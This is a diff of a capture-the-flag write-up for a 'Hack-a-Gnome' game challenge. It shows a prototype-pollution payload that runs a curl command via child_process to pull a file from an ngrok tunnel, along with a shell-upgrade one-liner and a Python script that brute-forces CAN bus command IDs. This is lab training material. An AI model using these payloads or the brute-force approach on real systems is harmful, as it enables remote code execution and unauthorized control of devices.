@@ -212,7 +212,6 @@ There was a hint indicating protype pollution in the stats page which uses a tem
     .....
     During my development of the robotic prototype, we found the factory's pollution to be undesirable, which is why we shut it down.
 
-!!! success "Answer"
   
 Rubén Santos García has an awesome blog post on [Prototype pollution] https://www.kayssel.com/newsletter/issue-24/ with a section specifically dedicated to RCE on template engine using prototype pollution.
 ![Hack-a-genome](../img/objectives/Hack_a_Gnome/Hack_a_Gnome_14.png)
@@ -279,6 +278,9 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 ![Hack-a-genome](../img/objectives/Hack_a_Gnome/Hack_a_Gnome_21.png)
 
+There are two important files in the remote server - canbus_client.py and README.md.<br/>
+canbus_client.py has the mapping of the keystrokes [up, down, left, right] with the CAN IDs.
+The mapping, however is not correct.
 canbus_client.py<br/>
 ??? tip "canbus_client.py"
     ```py title="canbus_client.py"
@@ -648,8 +650,303 @@ canbus_client.py<br/>
     the documentation for these - check back after eggnog break!
     ```
 
-    ---
+Now, the current canbus_client.py does not have the right command map to move the gnome, 
+we will need to brute force the hex values for the command map. <br/>
+But before that, we will need to upload the changed canbus_client.py to the server.
+
+We set up a ngrok listener poonted to a local python web server. <br/>
+The local python server is running from the directory where we have the original canbus_client.py copied from the server already.
+```
+ngrok http 80
+```
+![Hack-a-genome](../img/objectives/Hack_a_Gnome/Hack_a_Gnome_25.png)
+
+```
+python -m http.server 80
+```
+![Hack-a-genome](../img/objectives/Hack_a_Gnome/Hack_a_Gnome_26.png)
+
+
+we use the below payload with the /ctrlsignals endpoint.<br/>
+This would get the canbus_client.py from the URL https://transsepulchral-towardly-jazmin.ngrok-free.dev/canbus_client.py which then would get the URL from out local directory where the local python wer server is running.
+
+```
+{"action":"update", "key":"__proto__", "subkey":"outputFunctionName", "value":"test1;process.mainModule.require('child_process').execSync('$(curl https://transsepulchral-towardly-jazmin.ngrok-free.dev/canbus_client.py -o canbus_client.py)');test2"}
+```
+
+Below is the actual URL encoded version we would use. <br/>
+```
+%7B%22action%22%3A%22update%22%2C%20%22key%22%3A%22__proto__%22%2C%20%22subkey%22%3A%22outputFunctionName%22%2C%20%22value%22%3A%22test1%3Bprocess.mainModule.require%28%27child_process%27%29.execSync%28%27%24%28curl%20https%3A%2F%2Ftranssepulchral-towardly-jazmin.ngrok-free.dev%2Fcanbus_client.py%20-o%20canbus_client.py%29%27%29%3Btest2%22%7D
+```
+![Hack-a-genome](../img/objectives/Hack_a_Gnome/Hack_a_Gnome_27.png)
+
+Accessing the /status page would fetch the modified canbus_client.py from local python server to the remote machine via ngrok.<br/> 
+
+We modify the original canbus_client.py with bruteforcing the hex ranges.
+Using the range 0x200 - 0x2FF.
+
+??? "Python script - canbus_client.py with brutefoce range for the command map"
+    ```py linenums="1"
+    #!/usr/bin/python3
+    import can
+    import time
+    import argparse
+    import sys
+    import datetime  # To show timestamps for received messages
+
+    # ==================================================
+    # AUTO BRUTE-FORCE RANGE (FULL 11-BIT CAN SPACE)
+    # ==================================================
+    BRUTE_START_ID = 0x200
+    BRUTE_END_ID   = 0x2FF
+
+    # Known telemetry/status range from README
+    SKIP_RANGES = [
+        (0x300, 0x3FF),   # statusBatteryVoltageID ... statusHeartbeatID
+    ]
+
+    # ==================================================
+    # COMMAND MAP (AUTO-SCANNED PER DIRECTION)
+    # Each direction will try ALL opcodes in the range
+    # ==================================================
+    COMMAND_MAP = {
+        "up":    list(range(BRUTE_START_ID, BRUTE_END_ID + 1)),
+        "down":  list(range(BRUTE_START_ID, BRUTE_END_ID + 1)),
+        "left":  list(range(BRUTE_START_ID, BRUTE_END_ID + 1)),
+        "right": list(range(BRUTE_START_ID, BRUTE_END_ID + 1)),
+    }
+
+    COMMAND_CHOICES = list(COMMAND_MAP.keys()) + ["listen"]
+
+    IFACE_NAME = "gcan0"
+
+    # ==================================================
+    # HELPER: CHECK IF CAN ID IS IN A SKIP RANGE
+    # ==================================================
+    def in_skip_ranges(can_id: int) -> bool:
+        for start, end in SKIP_RANGES:
+            if start <= can_id <= end:
+                return True
+        return False
+
+    # ==================================================
+    # SEND SINGLE OPCODE (EMPTY PAYLOAD – ORIGINAL MODE)
+    # ==================================================
+    def send_opcode(bus, command_id):
+        message = can.Message(
+            arbitration_id=command_id,
+            data=[],                
+            is_extended_id=False
+        )
+        try:
+            bus.send(message)
+            print(f"Sent opcode: 0x{command_id:X}")
+        except can.CanError as e:
+            print(f"Error sending message: {e}")
+
+    # ==================================================
+    # AUTO-BRUTE FORCE FOR A GIVEN DIRECTION
+    # ==================================================
+    def send_command(bus, command_name):
+        opcode_list = COMMAND_MAP.get(command_name)
+
+        if not opcode_list:
+            print("No opcodes defined for this command.")
+            return
+
+        print(f"\n=== AUTO-BRUTE '{command_name.upper()}' ===")
+        print(f"Scanning 0x{BRUTE_START_ID:X} → 0x{BRUTE_END_ID:X}")
+        print("Skipping known telemetry ranges (0x300–0x3FF)")
+        print("Press CTRL+C immediately when motion is observed.\n")
+
+        try:
+            for opcode in opcode_list:
+                if in_skip_ranges(opcode):
+                    continue
+
+                send_opcode(bus, opcode)
+                time.sleep(0.25)  
+
+        except KeyboardInterrupt:
+            print("\n Motion detected (user interrupted).")
+            print("The LAST opcode printed above is the REAL command for this direction.")
+
+    # ==================================================
+    # LISTEN MODE (UNCHANGED)
+    # ==================================================
+    def listen_for_messages(bus):
+        print(f"Listening for messages on {bus.channel_info}. Press Ctrl+C to stop.")
+        try:
+            for msg in bus:
+                timestamp = datetime.datetime.now().strftime(
+                    '%Y-%m-%d %H:%M:%S.%f'
+                )[:-3]
+                print(f"{timestamp} | Received: {msg}")
+
+        except KeyboardInterrupt:
+            print("\nStopping listener...")
+        except Exception as e:
+            print(f"\nAn error occurred during listening: {e}")
+
+    # ==================================================
+    # MAIN
+    # ==================================================
+    def main():
+        parser = argparse.ArgumentParser(
+            description="Send CAN commands, auto-bruteforce movement opcodes, or listen."
+        )
+        parser.add_argument(
+            "command",
+            choices=COMMAND_CHOICES,
+            help=f"The command to send ({', '.join(COMMAND_MAP.keys())}) or 'listen'."
+        )
+        args = parser.parse_args()
+
+        try:
+            bus = can.interface.Bus(
+                channel=IFACE_NAME,
+                interface='socketcan',
+                receive_own_messages=False
+            )
+            print(f"Successfully connected to {IFACE_NAME}.")
+        except OSError as e:
+            print(f"Error connecting to CAN interface {IFACE_NAME}: {e}")
+            print(f"Make sure the {IFACE_NAME} interface is up:")
+            print(f"  sudo ip link set up {IFACE_NAME}")
+            sys.exit(1)
+        except Exception as e:
+            print(f"Unexpected error during bus initialization: {e}")
+            sys.exit(1)
+
+        # =========================
+        # MODE SELECTION
+        # =========================
+        if args.command == "listen":
+            listen_for_messages(bus)
+        else:
+            send_command(bus, args.command)
+
+        bus.shutdown()
+        print("CAN bus connection closed.")
+
+    if __name__ == "__main__":
+        main()
+    ```
+
+We try with below map and the gnome moves in all directions. <br/>
+```
+"up": 0x201,
+"down": 0x202,
+"left": 0x203,
+"right": 0x204,
+```
+
+??? "Python script - canbus_client.py with specific and working command map"
+    ```
+    #!/usr/bin/python3
+    import can
+    import time
+    import argparse
+    import sys
+    import datetime # To show timestamps for received messages
+
+    # Define CAN IDs (I think these are wrong with newest update, we need to check the actual device documentation)
+    COMMAND_MAP = {
+        "up": 0x201,
+        "down": 0x202,
+        "left": 0x203,
+        "right": 0x204,
+        # Add other command IDs if needed
+    }
+    # Add 'listen' as a special command option
+    COMMAND_CHOICES = list(COMMAND_MAP.keys()) + ["listen"]
+
+    IFACE_NAME = "gcan0"
+
+    def send_command(bus, command_id):
+        """Sends a CAN message with the given command ID."""
+        message = can.Message(
+            arbitration_id=command_id,
+            data=[], # No specific data needed for these simple commands
+            is_extended_id=False
+        )
+        try:
+            bus.send(message)
+            print(f"Sent command: ID=0x{command_id:X}")
+        except can.CanError as e:
+            print(f"Error sending message: {e}")
+
+    def listen_for_messages(bus):
+        """Listens for CAN messages and prints them."""
+        print(f"Listening for messages on {bus.channel_info}. Press Ctrl+C to stop.")
+        try:
+            # Iterate indefinitely over messages received on the bus
+            for msg in bus:
+                # Get current time for the timestamp
+                timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3] # Milliseconds precision
+                print(f"{timestamp} | Received: {msg}")
+                # You could add logic here to filter or react to specific messages
+                # if msg.arbitration_id == 0x100:
+                #    print("  (Noise message)")
+
+        except KeyboardInterrupt:
+            print("\nStopping listener...")
+        except Exception as e:
+            print(f"\nAn error occurred during listening: {e}")
+
+    def main():
+        parser = argparse.ArgumentParser(description="Send CAN bus commands or listen for messages.")
+        parser.add_argument(
+            "command",
+            choices=COMMAND_CHOICES,
+            help=f"The command to send ({', '.join(COMMAND_MAP.keys())}) or 'listen' to monitor the bus."
+        )
+        args = parser.parse_args()
+
+        try:
+            # Initialize the CAN bus interface
+            bus = can.interface.Bus(channel=IFACE_NAME, interface='socketcan', receive_own_messages=False) # Set receive_own_messages if needed
+            print(f"Successfully connected to {IFACE_NAME}.")
+        except OSError as e:
+            print(f"Error connecting to CAN interface {IFACE_NAME}: {e}")
+            print(f"Make sure the {IFACE_NAME} interface is up ('sudo ip link set up {IFACE_NAME}')")
+            print("And that you have the necessary permissions.")
+            sys.exit(1)
+        except Exception as e:
+            print(f"An unexpected error occurred during bus initialization: {e}")
+            sys.exit(1)
+
+        if args.command == "listen":
+            listen_for_messages(bus)
+        else:
+            command_id = COMMAND_MAP.get(args.command)
+            if command_id is None: # Should not happen due to choices constraint
+                print(f"Invalid command for sending: {args.command}")
+                bus.shutdown()
+                sys.exit(1)
+            send_command(bus, command_id)
+            # Give a moment for the message to be potentially processed if listening elsewhere
+            time.sleep(0.1)
+
+        # Shutdown the bus connection cleanly
+        bus.shutdown()
+        print("CAN bus connection closed.")
+
+    if __name__ == "__main__":
+        main()
+
+    ```
+
+The gnome moves now. <br/>
+We can move it to rach the lever on the top left to complete the chalenge.
+![Hack-a-genome](../img/objectives/Hack_a_Gnome/Hack_a_Gnome_29.png)
+
+
+!!! success "Answer"
+   Completed in the game.
 
 ## Response
-!!! quote "Kevin McFarland"
-    Excellent work! You've just demonstrated one of the most valuable skills in cybersecurity - the ability to think like the original programmer and unravel their logic without needing to execute a single line of code.<br/>
+!!! quote "Chris Davis"
+   Excellent work! You've successfully taken control of the gnome - look at that interface responding to our commands now.<br/>
+
+    Time to turn this little rebel against its own manufacturing operation and shut them down for good!
